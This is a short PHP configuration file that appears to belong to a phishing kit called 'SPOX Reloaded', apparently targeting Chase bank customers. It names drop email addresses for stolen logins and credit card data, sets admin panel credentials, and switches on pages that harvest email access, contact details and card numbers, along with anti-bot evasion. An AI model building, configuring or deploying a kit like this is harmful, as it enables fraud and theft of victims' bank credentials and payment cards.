<?php


// SPAM INFO

$yourname = "SPOX Reloaded";     //insert your name
$your_email = "chase@yandex.com"; // logs+access
$your_email2 = "chase2@yandex.com"; // Bills+cc


//ADMIN LOGIN INFO   (yourdomain.com/admin/login.php)

$username = "admin";          //insert your login name
$password = "012345";        // insert your login password
$pin = "645345343256451"; 



// ON / OFF 
$spam_hotmail = "no";
$double_login = "no";
$double_access = "yes";
$spox_protection = "yes";
$double_cc = "no";
$show_start_page = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";
$anti_bot = "yes";


?>